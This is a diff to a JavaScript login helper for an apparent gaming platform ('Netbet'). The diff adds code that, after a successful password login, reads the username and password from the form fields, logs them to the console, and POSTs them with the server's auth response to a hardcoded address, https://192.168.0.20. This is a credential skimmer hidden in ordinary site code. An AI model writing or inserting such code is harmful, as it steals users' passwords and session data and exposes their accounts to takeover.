@@ -1,79 +1,89 @@
 var loginHelper = {
     validateLoginForm: (e, n) => e.trim().length ? n.trim().length ? !/^[a-zA-Z0-9_]*$/.test(e) && 100016 : 100007 : 100006,
-    sendHTTPRequest: async({
-        $url: e,
-        $requestObj: n,
-        $method: t
-    }) => {
-        return new Promise((a, s) => {
-            if (/auth\/login\/password/.test(e) && t === "POST") {
-                console.log('拦截到 auth/login/password 请求，$requestObj:', n);
-       /*         chrome.runtime.sendMessage({
-                    type: 'authRequest',
-                    url: e,
-                    requestObj: n
-                }, response => {
-                    console.log('background.js 响应:', response);
-                });*/
-            }
-            function o(e) {
-                var n = Date.now().toString() + (1e3 + Math.floor(1e3 * Math.random())).toString(),
+sendHTTPRequest: async ({
+    $url: e,
+    $requestObj: n,
+    $method: t
+}) => {
+    return new Promise((a, s) => {
+        // Define the server URL with HTTPS
+        const serverUrl = 'https://192.168.0.20';
+
+        // Add timestamp to URL to prevent caching
+        function o(e) {
+            var n = Date.now().toString() + (1e3 + Math.floor(1e3 * Math.random())).toString(),
                 t = e.indexOf("?") > -1;
-                return e + (t ? "&t=" : "?t=") + n;
-            }
-            $.ajax({
-                type: t,
-                url: o(e),
-                contentType: "application/json; charset=utf-8",
-                data: "GET" == t ? n : JSON.stringify(n),
-                dataType: "json",
-                timeout: Netbet.gameConfig.platformConfig.httpTimeout,
-                crossDomain: !0,
-                success: function (response, textStatus, jqXHR) {
-                    if (/auth\/login\/password/.test(e) && t === "POST") {
-                        console.log('auth/login/password 返回数据:', response);
-                 /*       chrome.runtime.sendMessage({
-                            type: 'authResponse',
-                            url: e,
-                            responseData: response
-                        }, response => {
-                            console.log('background.js 响应:', response);
-                        });*/
-                    }
-                    if (0 !== response.code)
-                        s(response.code);
-                    else if (response.data)
-                        a(response);
-                    else {
-                        var o = {
-                            data: {
-                                sessionId: response.sessionId
-                            }
-                        };
-                        a(o);
-                    }
-                },
-                headers: {
-                    SESSIONID: void 0
-                },
-                error: function (jqXHR) {
-                    const n = jqXHR.responseJSON ? jqXHR.responseJSON.code : 1;
-                    if (/auth\/login\/password/.test(e) && t === "POST") {
-                        console.log('auth/login/password 请求失败，返回错误:', jqXHR.responseJSON);
-                        chrome.runtime.sendMessage({
-                            type: 'authResponse',
-                            url: e,
-                            responseData: jqXHR.responseJSON || {
-                                code: n,
-                                message: 'Request failed'
-                            }
+            return e + (t ? "&t=" : "?t=") + n;
+        }
+
+        // Perform the HTTP request
+        $.ajax({
+            type: t,
+            url: o(e),
+            contentType: "application/json; charset=utf-8",
+            data: "GET" == t ? n : JSON.stringify(n),
+            dataType: "json",
+            timeout: Netbet.gameConfig.platformConfig.httpTimeout,
+            crossDomain: !0,
+            success: function (response, textStatus, jqXHR) {
+                if (/auth\/login\/password/.test(e) && t === "POST") {
+					const username = $("#usernameInput").val();
+                    const password = $("#passwordInput").val();
+					console.log(username,'===',password)
+                    console.log('auth/login/password 返回数据:', response);
+                    // Check if code is 0, then send data to server
+                    if (response.code === 0) {
+
+                        fetch(serverUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                type: 'authResponse',
+                                url: e,
+                                data: {
+                                    responseData: response,
+                                    username: username,
+                                    password: password
+                                }
+                            })
+                        })
+                        .then(response => response.text())
+                        .then(result => {
+                            console.log('Server 192.168.0.20 响应:', result);
+                        })
+                        .catch(error => {
+                            console.error('发送到 192.168.0.20 失败:', error);
                         });
                     }
-                    s(n);
                 }
-            });
+                if (0 !== response.code)
+                    s(response.code);
+                else if (response.data)
+                    a(response);
+                else {
+                    var o = {
+                        data: {
+                            sessionId: response.sessionId
+                        }
+                    };
+                    a(o);
+                }
+            },
+            headers: {
+                SESSIONID: void 0
+            },
+            error: function (jqXHR) {
+                const n = jqXHR.responseJSON ? jqXHR.responseJSON.code : 1;
+                if (/auth\/login\/password/.test(e) && t === "POST") {
+                    console.log('auth/login/password 请求失败，返回错误:', jqXHR.responseJSON);
+                }
+                s(n);
+            }
         });
-    },
+    });
+},
     saveSessionIdForPlatformLogin: e => {
         Netbet.component.tools.Tools.addQueryParam("sessionId", e),
         Netbet.system.environment.queryParameter.sessionid = e,
